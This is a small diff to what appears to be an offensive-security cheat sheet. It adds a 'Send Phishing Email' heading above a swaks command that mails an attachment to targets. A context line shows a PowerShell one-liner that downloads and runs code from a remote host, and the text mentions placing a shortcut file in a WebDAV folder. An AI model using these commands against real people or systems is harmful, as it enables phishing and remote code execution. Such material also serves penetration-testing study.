@@ -232,6 +232,8 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<
 
 Put the `shortcut file` into the webdav folder.
 
+### Send Phishing Email
+
 ```c
 $ swaks --server <RHOST> -t <EMAIL> -t <EMAIL> --from <EMAIL> --header "Subject: Staging Script" --body <FILE>.txt --attach <FILE> --supress-data -ap
 ```
